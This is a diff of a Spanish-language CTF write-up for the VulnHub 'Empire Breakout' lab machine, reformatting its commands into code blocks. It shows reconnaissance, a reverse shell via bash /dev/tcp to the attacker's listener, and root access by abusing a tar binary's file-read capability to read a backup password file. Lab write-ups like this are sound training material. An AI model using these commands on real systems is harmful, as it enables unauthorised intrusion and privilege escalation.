@@ -9,12 +9,16 @@ OBJETIVO: Linux 192.168.131.129 (Empire Breakout) <br>
 ## SECUENCIA DE ATAQUE
 
 ### FASE 1: PREPARACIÓN 
-mkdir ~/Desktop/vulnhub && cd ~/Desktop/vulnhub <br>
-ping -c 4 192.168.131.129  # Verificación de conectividad <br>
+```bash
+mkdir ~/Desktop/vulnhub && cd ~/Desktop/vulnhub
+ping -c 4 192.168.131.129  # Verificación de conectividad
+```
 Resultado: Objetivo accesible. <br>
 
 ### FASE 2: RECONOCIMIENTO
-nmap -sC -sV -p- --open -oN escaneo 192.168.131.129 <br>
+```bash
+nmap -sC -sV -p- --open -oN escaneo 192.168.131.129
+```
 Puertos identificados: <br>
 •	80/tcp - Apache httpd (página web) <br>
 •	139/tcp - Samba smbd 4.6.2 <br>
@@ -32,10 +36,14 @@ Extracción de credenciales: <br>
 •	Código Brainfuck localizado al final del HTML <br>
 •	Decodificación: decode.fr → Contraseña obtenida: .2uqPEfj3D<P'a-3 <br>
  <br>
+```bash
 echo ".2uqPEfj3D<P'a-3" > clave  # Almacenamiento seguro <br>
+```
 
 Enumeración de usuarios: <br>
-enum4linux -a 192.168.131.129 <br>
+```bash
+enum4linux -a 192.168.131.129
+```
 Usuario identificado: cyber <br>
 
 ### FASE 4: ACCESO INICIAL
@@ -47,40 +55,54 @@ Autenticación: <br>
  <br>
 Primera flag: <br>
 En la parte inferior, clicar en la consola de comandos.<br>
-ls          # Exploración directorio <br>
-cat user.txt # Flag user obtenida <br>
+```bash
+ls          # Exploración directorio
+cat user.txt # Flag user obtenida
+```
 
 ### FASE 5: SHELL REVERSA
 Preparación listener: <br>
-ifconfig                    # IP local: 192.168.131.128 <br>
-nc -lvp 443                # Listener puerto 443 <br>
+```bash
+ifconfig                    # IP local: 192.168.131.128
+nc -lvp 443                # Listener puerto 443
+```
 
 Ejecución desde Command Shell del panel: <br>
-bash -i >& /dev/tcp/192.168.131.128/443 0>&1 <br>
-Shell reversa establecida como usuario cyber <br>
- <br>
+```bash
+bash -i >& /dev/tcp/192.168.131.128/443 0>&1
+Shell reversa establecida como usuario cyber
+```
+
 ### FASE 6: ESCALADA DE PRIVILEGIOS
 
 Enumeración de privilegios: <br>
-sudo -l                     # Sin resultados <br>
-getcap -r / 2>/dev/null    # CRÍTICO: /home/cyber/tar cap_dac_read_search=ep <br>
- <br>
+```bash
+sudo -l                     # Sin resultados
+getcap -r / 2>/dev/null    # CRÍTICO: /home/cyber/tar cap_dac_read_search=ep
+```
+
 Identificación objetivo: <br>
-cd /var/backups <br>
-ls -la                     # Archivo: .old_pass.bak (propiedad root) <br>
+```bash
+cd /var/backups
+ls -la                     # Archivo: .old_pass.bak (propiedad root)
+```
 
 Explotación capabilities: <br>
-cd /home/cyber <br>
-./tar -cf clave.tar /var/backups/.old_pass.bak  # Compresión con capabilities <br>
-tar -xvf clave.tar                              # Extracción <br>
+```bash
+cd /home/cyber
+./tar -cf clave.tar /var/backups/.old_pass.bak  # Compresión con capabilities
+tar -xvf clave.tar                              # Extracción
 cd var/backups <br>
-cat .old_pass.bak                               # Contraseña root: Ts&4&YurgtRX(=~h <br>
+cat .old_pass.bak                               # Contraseña root: Ts&4&YurgtRX(=~h
+```
 
 Escalada final:
-su root                    # Password: Ts&4&YurgtRX(=~h <br>
-script /dev/null -c bash   # Estabilización shell <br>
-cd /root <br>
-cat root.txt              # Flag root obtenida <br>
+```bash
+su root                    # Password: Ts&4&YurgtRX(=~h
+script /dev/null -c bash   # Estabilización shell
+cd /root
+cat root.txt              # Flag root obtenida
+```
 
 ## VULNERABILIDADES CRÍTICAS EXPLOTADAS
 
